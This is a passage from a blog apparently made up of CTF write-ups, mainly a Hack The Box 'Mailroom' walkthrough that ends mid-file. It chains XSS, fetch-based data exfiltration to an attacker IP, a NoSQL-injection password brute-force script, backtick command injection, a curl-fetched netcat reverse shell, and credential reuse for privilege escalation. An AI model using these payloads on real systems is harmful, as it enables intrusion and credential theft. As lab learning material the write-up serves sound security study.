Cypher Injection Saga | SideChannel – Tempest Cypher Injection (neo4j) - HackTricks Fun with Cypher Injections - HackMD Cypher Injection Cheat Sheet - Pentester Land Malicious Python Packages and Code Execution via pip download · Embrace The Red Automatic Execution of Code Upon Package Download on Python Package Manager | by Yehuda Gelb | checkmarx-security | Medium Pip Download Code Execution | Exploit Notes ","date":"27 August 2023","permalink":"/blog/20230825-htb-onlyforyou/","section":"Blog Posts","summary":"OnlyForYou is a Medium Linux box that requires source code analysis. The vhost has a file read vulnerability caused by the \u003ccode\u003eos.path.join()\u003c/code\u003e function, enabling access to the source code of another virtual host. This, in turn, exposes a command injection vulnerability by bypassing the regex. Additionally, an internal site is susceptible to cipher injection, which allows exfiltrating user hashes. Root escalation involves exploiting pip download using a malicious Python package","title":"HTB OnlyForYou"},{"content":"","date":null,"permalink":"/tags/malicious-python-package/","section":"Tags","summary":"","title":"Malicious Python Package"},{"content":"Mailroom HTB # The contact us page on the site is vulnerable to XXS, which gives access to an internal website that is vulnerable to NoSQLi and exfil the passwords of valid users. Using command injection gives a shell on the docker container. The container has credentials for another user on the machine, with which we see a user using kpcli to interact with a KeePass database. Using strace to dump the database\u0026rsquo;s master password found credentials for other users, including root.\nEnumeration # Open Ports #Found 2 open ports using nmap,\nport 22 → SSH port 80 → Apache web server Although banners for both services are different, could be because of containerization or virtualization\nnmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.11.209 10.10.11.209 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 01:52 EDT Nmap scan report for 10.10.11.209 Host is up (0.057s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA) | 256 821beb758b9630cf946e7957d9ddeca7 (ECDSA) |\\_ 256 19fb45feb9e4275de5bbf35497dd68cf (ED25519) 80/tcp open http Apache httpd 2.4.54 ((Debian)) |\\_http-server-header: Apache/2.4.54 (Debian) |\\_http-title: The Mail Room Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel HTTP - mailroom.htb #According to the site\u0026rsquo;s response headers, it is PHP based.\n\u0026gt; http -ph 10.10.11.209 HTTP/1.1 200 OK ... ... Server: Apache/2.4.54 (Debian) Vary: Accept-Encoding X-Powered-By: PHP/7.4.33 Looks like landing page for a shipping services company\nFound a reference to the domain mailroom.htb in the footer, adding it to /etc/hosts Potential usernames in the About Us page\nTristan Pitt Matthew Conley Chris McLovin' Vivien Perkins There\u0026rsquo;s also a contact form at /contact.php, which seems to be operated by an AI. Since there is a third part interacting with the data, testing it with dummy data\nWhat\u0026rsquo;s interesting is submitting the form returns a link to view it\nThe link reflects all input fields except the title; however, the Inquiry status heading is new.\nSince the message body is reflected, my very first thought is XSS. Using a basic XXS payload like \u0026lt;script\u0026gt;alert('XSS')\u0026lt;/script\u0026gt; in the message field and visiting the link gives a XSS pop up.\nSince it is vulnerable to XXS, I tried to grab cookies, but neither of these payloads worked\n\u0026lt;script\u0026gt;document.location='http://10.10.14.35/?c='+document.cookie\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src='http://10.10.14.35/cookie.php?c='+localStorage.getItem('token');\u0026lt;/script\u0026gt; Fuzzing for directories and files didn\u0026rsquo;t uncover anything new\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://10.10.11.209/FUZZ -o ffuf_mailroom.md -of md -t 100 -e .php -fs 277 . [Status: 200, Size: 7748, Words: 2851, Lines: 129, Duration: 64ms] index.php [Status: 200, Size: 7748, Words: 2851, Lines: 129, Duration: 62ms] contact.php [Status: 200, Size: 4317, Words: 1297, Lines: 87, Duration: 61ms] about.php [Status: 200, Size: 6891, Words: 2761, Lines: 119, Duration: 59ms] services.php [Status: 200, Size: 4336, Words: 1307, Lines: 76, Duration: 57ms] However, bruteforcing vhosts with wfuzz, a new virtual host was uncovered: git.mailroom.htb\n\u0026gt; wfuzz_subdomain_enum mailroom.htb --hh 7746 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://mailroom.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000262: 200 267 L 1181 W 13089 Ch \u0026#34;git\u0026#34; Total time: 0 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 0 Gitea - git.mailroom.htb #The landing page shows Gitea\u0026rsquo;s version is 1.18.0, couldn\u0026rsquo;t find any exploits for this version\nIt contains a repository owned by Matthew, containing content related to what appears to be a staffroom website.\nBased on this from auth.php, the website seems to be using MongoDB as the backend.\n$client = new MongoDB\\Client(\u0026#34;mongodb://mongodb:27017\u0026#34;); // Connect to the MongoDB database Discovered a reference to a new vhost: staff-review-panel.mailroom.htb.\nHowever, the vhost returns a 403, maybe it\u0026rsquo;s an internal site\n\u0026gt; http -ph staff-review-panel.mailroom.htb HTTP/1.1 403 Forbidden Connection: Keep-Alive Content-Length: 296 Content-Type: text/html; charset=iso-8859-1 Date: Mon, 17 Jul 2023 09:19:29 GMT Keep-Alive: timeout=5, max=100 Server: Apache/2.4.54 (Debian) Additionally, in the event of invalid credentials, the site simply returns some JSON data. Ideally, in PHP, there should have been an exit statement after this to halt the execution of the remaining code, but this is not the case here.\nAnother file in the source code, inspect.php also appears interesting. The shell_exec() can potentially lead to code execution\nIt accepts inquiry_id as a POST parameter and removes a few special characters and then passes to shell_exec() if (isset($_POST[\u0026#39;inquiry_id\u0026#39;])) { $inquiryId = preg_replace(\u0026#39;/[\\$\u0026lt;\u0026gt;;|\u0026amp;{}\\(\\)\\[\\]\\\u0026#39;\\\u0026#34;]/\u0026#39;, \u0026#39;\u0026#39;, $_POST[\u0026#39;inquiry_id\u0026#39;]); $contents = shell_exec(\u0026#34;cat /var/www/mailroom/inquiries/$inquiryId.html\u0026#34;); Fuzzing the Gitea website, found a sitemap which could have links to some other assets.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://git.mailroom.htb/FUZZ -o ffuf_git.md -of md -t 100 favicon.ico [Status: 301, Size: 58, Words: 3, Lines: 3, Duration: 68ms] sitemap.xml [Status: 200, Size: 267, Words: 4, Lines: 3, Duration: 90ms] . [Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 70ms] The sitemap links to two other sitemaps for users and repositories respectively\n\u0026gt; http -pb git.mailroom.htb/sitemap.xml ...snip... \u0026lt;loc\u0026gt;http://git.mailroom.htb/explore/users/sitemap-1.xml\u0026lt;/loc\u0026gt; ...snip... \u0026lt;loc\u0026gt;http://git.mailroom.htb/explore/repos/sitemap-1.xml\u0026lt;/loc\u0026gt; ...snip... The user sitemap gives three usernames,\nadministrator matthew tristan \u0026gt; http -pb git.mailroom.htb/explore/users/sitemap-1.xml ...snip... \u0026lt;url\u0026gt; \u0026lt;loc\u0026gt;http://git.mailroom.htb/administrator\u0026lt;/loc\u0026gt; ...snip... \u0026lt;loc\u0026gt;http://git.mailroom.htb/matthew\u0026lt;/loc\u0026gt; ...snip... \u0026lt;loc\u0026gt;http://git.mailroom.htb/tristan\u0026lt;/loc\u0026gt; ...snip... Foothold # Exfiltrating data using XXS #Since the staff site is forbidden when accessed internally, maybe it can be accessed using the XSS vulnerability on the contact page. A payload like this works. Additionally, the data must be base64 encoded, as it is being exfiltrated as an HTTP parameter.\nfetch(\u0026#34;http://staff-review-panel.mailroom.htb\u0026#34;).then((r) =\u0026gt; r .text() .then((data) =\u0026gt; fetch( `http://10.10.14.35/exfil?data=${btoa( unescape(encodeURIComponent(data)) )}` ) ) ); I developed a small Flask application to automate the decoding process for each request. Using the payload returns the source for the staff review site.\n\u0026gt; python xss_exfil.py 2023-07-17 18:32:34,435 - INFO - Starting server on http://0.0.0.0:80, use \u0026lt;Ctrl-C\u0026gt; to stop \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, shrink-to-fit=no\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;author\u0026#34; content=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Inquiry Review Panel\u0026lt;/title\u0026gt; \u0026lt;!-- Favicon--\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/x-icon\u0026#34; href=\u0026#34;assets/favicon.ico\u0026#34; /\u0026gt; \u0026lt;!-- Bootstrap icons--\u0026gt; \u0026lt;link href=\u0026#34;font/bootstrap-icons.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;!-- Core theme CSS (includes Bootstrap)--\u0026gt; \u0026lt;link href=\u0026#34;css/styles.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;wrapper fadeInDown\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;formContent\u0026#34;\u0026gt; \u0026lt;!-- Login Form --\u0026gt; \u0026lt;form id=\u0026#39;login-form\u0026#39; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Panel Login\u0026lt;/h2\u0026gt; \u0026lt;input required type=\u0026#34;text\u0026#34; id=\u0026#34;email\u0026#34; class=\u0026#34;fadeIn second\u0026#34; name=\u0026#34;email\u0026#34; placeholder=\u0026#34;Email\u0026#34;\u0026gt; \u0026lt;input required type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; class=\u0026#34;fadeIn third\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;fadeIn fourth\u0026#34; value=\u0026#34;Log In\u0026#34;\u0026gt; \u0026lt;p hidden id=\u0026#34;message\u0026#34; style=\u0026#34;color: #8F8F8F\u0026#34;\u0026gt;Only show this line if response - edit code\u0026lt;/p\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;!-- Remind Passowrd --\u0026gt; \u0026lt;div id=\u0026#34;formFooter\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;underlineHover\u0026#34; href=\u0026#34;register.html\u0026#34;\u0026gt;Create an account\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Bootstrap core JS--\u0026gt; \u0026lt;script src=\u0026#34;js/bootstrap.bundle.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- Login Form--\u0026gt; \u0026lt;script\u0026gt; // Get the form element const form = document.getElementById(\u0026#39;login-form\u0026#39;); // Add a submit event listener to the form form.addEventListener(\u0026#39;submit\u0026#39;, event =\u0026gt; { // Prevent the default form submission event.preventDefault(); // Send a POST request to the login.php script fetch(\u0026#39;/auth.php\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: new URLSearchParams(new FormData(form)), headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } }).then(response =\u0026gt; { return response.json(); }).then(data =\u0026gt; { // Display the name and message in the page document.getElementById(\u0026#39;message\u0026#39;).textContent = data.message; document.getElementById(\u0026#39;password\u0026#39;).value = \u0026#39;\u0026#39;; document.getElementById(\u0026#39;message\u0026#39;).removeAttribute(\u0026#34;hidden\u0026#34;); }).catch(error =\u0026gt; { // Display an error message //alert(\u0026#39;Error: \u0026#39; + error); }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 10.10.11.209 - - [17/Jul/2023 18:32:42] \u0026#34;GET /exfil?data=CjwhRE9DVFlQRSBodG1sPgo8aH ...snip... ...snip... Based on this, we know\nthe /auth.php endpoint accepts a POST request the content type is, application/x-www-form-urlencoded this will return JSON data fetch(\u0026#39;/auth.php\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: new URLSearchParams(new FormData(form)), headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } }).then(response =\u0026gt; { return response.json(); Investigating the new /auth.php endpoint based on this new info. Given that the endpoint is related to authentication and the database is MongoDB, it\u0026rsquo;s possible that it might be susceptible to NoSQL injection.\nExploiting NoSQLi #Modified the previous script to conduct a test for NoSQLi. The main payload here is email[$ne]=abraxas\u0026amp;password[$ne]=abraxas. Given the extremely remote possibility of an existing user with these credentials, a positive response from this query will confirm NoSQL injection.\nnosqli.js\n// var formData = \u0026#34;email[$exists]=true\u0026amp;password[$exists]=true\u0026#34;; var formData = \u0026#34;email[$ne]=abraxas\u0026amp;password[$ne]=abraxas\u0026#34;; fetch(\u0026#34;http://staff-review-panel.mailroom.htb/auth.php\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: formData, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, }, }) .then((response) =\u0026gt; { return response.text(); }) .then((text) =\u0026gt; { console.log(text); // Log the response content to the console return fetch( `http://10.10.14.35/exfil?data=${btoa( unescape(encodeURIComponent(text)) )}` ); }) .catch((error) =\u0026gt; { console.error(\u0026#34;Error:\u0026#34;, error); }); Since this script is much bigger than the previous one, using src to upload the script via XSS, as it\u0026rsquo;s easier to replicate the request.\n\u0026gt; http -pB POST mailroom.htb/contact.php \\ email=abraxas@mailroom.htb \\ title=Test \\ message=\u0026#39;\u0026lt;script src=\u0026#34;http://10.10.14.35/nosqli.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39; \\ -f Using the same Flask app as before, the decoded text indicates that the request was successful and that a 2FA token has been sent to an inbox.\n2023-07-17 23:03:04,872 - INFO - 10.10.11.209 - - [17/Jul/2023 23:03:04] \u0026#34;GET /nosqli.js HTTP/1.1\u0026#34; 200 - {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Invalid input detected\u0026#34;}{\u0026#34;success\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Check your inbox for an email with your 2FA token\u0026#34;} 2023-07-17 23:03:05,039 - INFO - 10.10.11.209 - - [17/Jul/2023 23:03:05] \u0026#34;GET /exfil?data=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1\u0026#34; 200 - There are actually two JSON responses here, one of which is invalid and the next is successful because the invalid response lacks an exit statement, allowing the remainder code to execute. Testing the three usernames found on the Gitea sitemap. Since the login page needs an email, appending @mailroom.htb to the usernames.\nuser_enum.js\n// var formData = \u0026#34;email[$eq]=administrator@mailroom.htb\u0026amp;password[$exists]=true\u0026#34;; var formData = \u0026#34;email[$eq]=tristan@mailroom.htb\u0026amp;password[$exists]=true\u0026#34;; // var formData = \u0026#34;email[$eq]=matthew@mailroom.htb\u0026amp;password[$exists]=true\u0026#34;; fetch(\u0026#34;http://staff-review-panel.mailroom.htb/auth.php\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: formData, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, }, }) .then((response) =\u0026gt; { return response.text(); }) .then((text) =\u0026gt; { console.log(text); return fetch( `http://10.10.14.35/exfil?data=${btoa( unescape(encodeURIComponent(text)) )}` ); }) .catch((error) =\u0026gt; { console.error(\u0026#34;Error:\u0026#34;, error); }); \u0026gt; http -pB POST mailroom.htb/contact.php email=abraxas@mailroom.htb title=Test message=\u0026#39;\u0026lt;script src=\u0026#34;http://10.10.14.35/user_enum.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39; -f I get a success response with tristan, so its a valid user on the staff website.\n\u0026gt; python xxs_flask.py * Serving Flask app \u0026#39;xxs_flask\u0026#39; * Debug mode: off 2023-07-18 05:35:16,670 - INFO - WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:80 * Running on http://192.168.253.133:80 2023-07-18 05:35:16,670 - INFO - Press CTRL+C to quit 2023-07-18 05:35:53,458 - INFO - 10.10.11.209 - - [18/Jul/2023 05:35:53] \u0026#34;GET /nosqli.js HTTP/1.1\u0026#34; 200 - {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Invalid input detected\u0026#34;}{\u0026#34;success\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Check your inbox for an email with your 2FA token\u0026#34;} 2023-07-18 05:35:53,638 - INFO - 10.10.11.209 - - [18/Jul/2023 05:35:53] \u0026#34;GET /exfil?data=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1\u0026#34; 200 - Now that we have the username, the next step is to brute force the password for Tristan. Initially I tried crafting an async script with fetch(), but it didn\u0026rsquo;t work as expected, so I eventually switched to sending the requests via XMLHttpRequest synchronously. Certain special characters had to be excluded from the character set due to a potential conflict with the regex validation. It\u0026rsquo;s plausible that a step was overlooked during this trial and error process, and this could be a false positive.\nvar password = \u0026#34;\u0026#34;; // Removed special chars like $,*,?,+... etc, might cause issues with regex var charset = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!%\u0026lt;\u0026gt;@#\u0026#34;; for (let i = 0; i \u0026lt; charset.length; i++) { var payload_req = new XMLHttpRequest(); let test_pass = password + charset[i]; // Doesn\u0026#39;t like async payload_req.open( \u0026#34;POST\u0026#34;, \u0026#34;http://staff-review-panel.mailroom.htb/auth.php\u0026#34;, false ); payload_req.setRequestHeader( \u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34; ); payload_req.send( \u0026#34;email=tristan@mailroom.htb\u0026amp;password[$regex]=\u0026#34; + test_pass + \u0026#34;.*\u0026#34; ); if (payload_req.responseText.includes(\u0026#34;2FA\u0026#34;)) { password += charset[i]; var exfil = new XMLHttpRequest(); exfil.open(\u0026#34;GET\u0026#34;, \u0026#34;http://10.10.14.35/?passwd=\u0026#34; + password, true); exfil.send(); // reset the loop i = 0; } } Subsequently, the python server starts receiving a series of requests, that ultimately provide the password for the user tristan: 69trisRulez!\n\u0026gt; www Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.209 - - [25/Apr/2023 16:20:31] code 404, message File not found 10.10.11.209 - - [25/Apr/2023 16:20:32] \u0026#34;GET /password_bruteforce.js HTTP/1.1\u0026#34; 200 - 10.10.11.209 - - [25/Apr/2023 16:20:44] \u0026#34;GET /password_bruteforce.js HTTP/1.1\u0026#34; 200 - 10.10.11.209 - - [25/Apr/2023 16:20:45] code 404, message File not found 10.10.11.209 - - [25/Apr/2023 16:20:45] \u0026#34;GET /passwd?6 HTTP/1.1\u0026#34; 404 - ... ... 10.10.11.209 - - [25/Apr/2023 16:25:46] \u0026#34;GET /password_bruteforce.js HTTP/1.1\u0026#34; 200 - 10.10.11.209 - - [25/Apr/2023 16:25:48] code 404, message File not found 10.10.11.209 - - [25/Apr/2023 16:25:48] \u0026#34;GET /passwd?69trisRulez! HTTP/1.1\u0026#34; 404 - Since the staffroom site is still inaccessible, decided to reuse the credentials for SSH. This resulted in obtaining a shell as tristan!\n\u0026gt; pc \u0026#39;tristan:69trisRulez!\u0026#39;@mailroom.htb [09:16:08] Welcome to pwncat 🐈! __main__.py:164 [09:16:11] mailroom.htb:22: registered new host w/ db manager.py:957 (local) pwncat$ (remote) tristan@mailroom:/home/tristan$ id uid=1000(tristan) gid=1000(tristan) groups=1000(tristan) (remote) tristan@mailroom:/home/tristan$ Horizontal Privilege Escalation # Tristan lacks any sudo privileges.\n(remote) tristan@mailroom:/home/tristan$ sudo -l [sudo] password for tristan: Sorry, user tristan may not run sudo on mailroom. However, I discovered another user named matthew with a login shell, as indicated in /etc/passwd and /home directory.\n(remote) tristan@mailroom:/home/tristan$ ls -la /home total 16 drwxr-xr-x 4 root root 4096 Jan 15 2023 . drwxr-xr-x 18 root root 4096 Mar 26 00:46 .. drwxr-xr-x 3 matthew matthew 4096 Jul 19 13:17 matthew drwxr-xr-x 4 tristan tristan 4096 Jan 15 2023 tristan (remote) tristan@mailroom:/home/tristan$ cat /etc/passwd | grep sh$ root❌0:0:root:/root:/bin/bash tristan❌1000:1000:tristan:/home/tristan:/bin/bash matthew❌1001:1001:,,,:/home/matthew:/bin/bash On successful authentication response from the staff site, it indicates that a 2FA token has been sent to a mail with the message: {\u0026quot;success\u0026quot;:true,\u0026quot;message\u0026quot;:\u0026quot;Check your inbox for an email with your 2FA token\u0026quot;}. Using this information, found an email for the user tristan in the /var/mail directory, which contains the 2FA token.\n(remote) tristan@mailroom:/var/mail$ ls -la total 16 drwxrwsr-x 2 root mail 4096 Jul 19 13:14 . drwxr-xr-x 12 root root 4096 Jan 19 13:22 .. -rw------- 1 root mail 1 Jan 15 2023 root -rw------- 1 tristan mail 417 Jul 19 13:18 tristan (remote) tristan@mailroom:/var/mail$ cat tristan Return-Path: \u0026lt;noreply@mailroom.htb\u0026gt; X-Original-To: tristan@mailroom.htb Delivered-To: tristan@mailroom.htb Received: from localhost (unknown [172.19.0.5]) by mailroom.localdomain (Postfix) with SMTP id E2E681CB3 for \u0026lt;tristan@mailroom.htb\u0026gt;; Wed, 19 Jul 2023 13:14:50 +0000 (UTC) Subject: 2FA Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=9eafe490e2ae459894df81a7f3b7b2ce Despite being unable to locate the source code for the site, it can be accessed using curl on localhost.\n(remote) tristan@mailroom:/dev/shm$ curl -I staff-review-panel.mailroom.htb HTTP/1.1 200 OK Date: Wed, 19 Jul 2023 13:52:20 GMT Server: Apache/2.4.54 (Debian) X-Powered-By: PHP/7.4.33 Set-Cookie: PHPSESSID=82f030a6564259c7edf5f9d308875788; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Access-Control-Allow-Origin: * Content-Type: text/html; charset=UTF-8 Given that the site seems to be internal, forwarding port 80 using SSH using the existing connection. Also added the vhosts for 127.0.0.1 on the attack box.\n\u0026gt; _ echo \u0026#39;127.0.0.1 mailroom.htb git.mailroom.htb staff-review-panel.mailroom.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts \u0026gt; ssh tristan@mailroom.htb -N -L 80:127.0.0.1:80 tristan@mailroom.htb\u0026#39;s password: Shell as www-data in the container #With the auth token from Tristan\u0026rsquo;s email, the staff review website can be accessed. Nevertheless, the dashboard itself doesn\u0026rsquo;t provide a lot of information.\nThe Inspect page is interesting, it accepts inquiry IDs and can\nsearch for inquires check for status of the inquiry This relates to the shell_exec() vulnerability found earlier on Gitea.\nif (isset($_POST[\u0026#39;inquiry_id\u0026#39;])) { $inquiryId = preg_replace(\u0026#39;/[\\$\u0026lt;\u0026gt;;|\u0026amp;{}\\(\\)\\[\\]\\\u0026#39;\\\u0026#34;]/\u0026#39;, \u0026#39;\u0026#39;, $_POST[\u0026#39;inquiry_id\u0026#39;]); $contents = shell_exec(\u0026#34;cat /var/www/mailroom/inquiries/$inquiryId.html\u0026#34;); Given this information, it\u0026rsquo;s apparent that characters such as $\u0026lt;\u0026gt;;|\u0026amp;[] are filtered, preventing command chaining. However, backticks remain unfiltered and can be used for command injection. Sending a request like this returns a response on a local HTTP server running on the attack box, confirming command injection on the inquiry_id parameter.\n\u0026gt; http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID=d9e2302f38cb5348e2254ef887b4cf66 inquiry_id=\u0026#39;test`curl http://10.10.14.35:8000`\u0026#39; -f To establish a reverse shell, uploaded a shell that utilized the netcat mkfifo reverse shell and executed it.\n\u0026gt; echo \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.35 9005 \u0026gt;/tmp/f\u0026#39; \u0026gt; revshell.sh \u0026gt; http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID=d9e2302f38cb5348e2254ef887b4cf66 inquiry_id=\u0026#39;test`curl http://10.10.14.35:8000/revshell.sh --output /dev/shm/revshell.sh`\u0026#39; -f \u0026gt; http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID=d9e2302f38cb5348e2254ef887b4cf66 inquiry_id=\u0026#39;test`bash /dev/shm/revshell.sh`\u0026#39; -f Successfully acquired a shell as the user www-data within what appears to be a Docker container environment.\n(local) pwncat$ connect -lp 9005 [10:22:49] received connection from 10.10.11.209:45642 bind.py:84 [10:22:52] 0.0.0.0:9005: upgrading from /bin/dash to /bin/bash manager.py:957 [10:22:53] 10.10.11.209:45642: registered new host w/ db manager.py:957 (local) pwncat$ (remote) www-data@53d93393da5c:/var/www/staffroom$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) (remote) www-data@53d93393da5c:/var/www/staffroom$ hostname 53d93393da5c (remote) www-data@53d93393da5c:/var/www/staffroom$ ls -la /.dockerenv -rwxr-xr-x 1 root root 0 Jul 19 12:29 /.dockerenv Docker escape #The git repository containing the source code for the site is located at /var/www/staffroom. While enumerating the git repository, came across credentials within the Git remote URL.\n(remote) www-data@53d93393da5c:/var/www/staffroom$ git log --pretty=oneline 4b6cd765986ff06ea7247528c42b4127633beb22 (HEAD -\u0026gt; main, origin/main, origin/HEAD) fixed path bug \u0026amp; email spam 1677521748602cce2f0d7ab25664ac6d414e26ef fixed path problem 4d3b167f4f228d18f97bb85da6983ff629274a3a added site (remote) www-data@53d93393da5c:/var/www/staffroom$ git remote -v origin http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git (fetch) origin http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git (push) Although the credentials seem to be invalid on Gitea, there\u0026rsquo;s an interesting nuance with the URL encoding. The %23 is URL-encoded and translates to a # symbol. Consequently, Gitea accepts the credentials matthew:HueLover83#. These same credentials are also reused on matthew\u0026rsquo;s local account.\n(remote) tristan@mailroom:/dev/shm$ su matthew Password: matthew@mailroom:/dev/shm$ id uid=1001(matthew) gid=1001(matthew) groups=1001(matthew) matthew@mailroom:/dev/shm$ cd matthew@mailroom:~$ ls -la total 32 drwxr-xr-x 3 matthew matthew 4096 Jul 19 14:40 . drwxr-xr-x 4 root root 4096 Jan 15 2023 .. lrwxrwxrwx 1 matthew matthew 9 Jan 15 2023 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 matthew matthew 220 Jan 15 2023 .bash_logout -rw-r--r-- 1 matthew matthew 3771 Jan 15 2023 .bashrc drwx------ 2 matthew matthew 4096 Jan 15 2023 .cache lrwxrwxrwx 1 root root 9 Jan 15 2023 .kpcli-history -\u0026gt; /dev/null -rw-r--r-- 1 matthew matthew 1998 Mar 16 22:47 personal.kdbx -rw-r--r-- 1 matthew matthew 807 Jan 15 2023 .profile -rw-r----- 1 root matthew 33 Jul 19 12:29 user.txt lrwxrwxrwx 1 matthew matthew 9 Jan 15 2023 .viminfo -\u0026gt; /dev/null Privilege Escalation to root # The user matthew also lacks sudo privileges.\n(remote) matthew@mailroom:/home/matthew$ sudo -l [sudo] password for matthew: Sorry, user matthew may not run sudo on mailroom. Interestingly, a keepass database is present in the home directory.\n\u0026gt; file personal.kdbx personal.kdbx: Keepass password database 2.x KDBX However, I cannot open the database, it needs a master password Created a hash using keepass2john, but can\u0026rsquo;t crack it with rockyou as the wordlist\nNonetheless, accessing the database requires a master password. In an attempt to crack the password, created a hash using keepass2john, but the password isn\u0026rsquo;t found within the rockyou.txt wordlist.\n\u0026gt; keepass2john personal.kdbx \u0026gt; keepass_hash.txt \u0026gt; john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt With nothing else left, ran pspy to look for background processes and found kpcli. It appears that matthew (UID 1001) is executing the kpcli script.\n2023/07/19 16:19:32 CMD: UID=1001 PID=79331 | -bash -c /usr/bin/kpcli 2023/07/19 16:19:32 CMD: UID=1001 PID=79332 | /usr/bin/locale-check C.UTF-8 2023/07/19 16:19:32 CMD: UID=1001 PID=79333 | /usr/bin/perl /usr/bin/kpcli It seems that kpcli is a Perl script owned by the root user. It seems to be a CLI program for managing Keepass databases.\n(remote) matthew@mailroom:/home/matthew$ file /usr/bin/kpcli /usr/bin/kpcli: Perl script text executable (remote) matthew@mailroom:/home/matthew$ ls -la /usr/bin/kpcli -rwxr-xr-x 1 root root 193792 Aug 21 2016 /usr/bin/kpcli (remote) matthew@mailroom:/home/matthew$ cat /usr/bin/kpcli #!/usr/bin/perl ########################################################################### # # kpcli - KeePass Command Line Interface # # Author: Lester Hightower \u0026lt;hightowe at cpan dot org\u0026gt; # # This program was inspired by \u0026#34;kedpm -c\u0026#34; and resulted despite illness # (or more likely because of it) over the USA Thanksgiving holiday in # late November of 2010. As a long-time user of the Ked Password Manager # I really missed a command line interface after getting an Android cell # phone and switching to 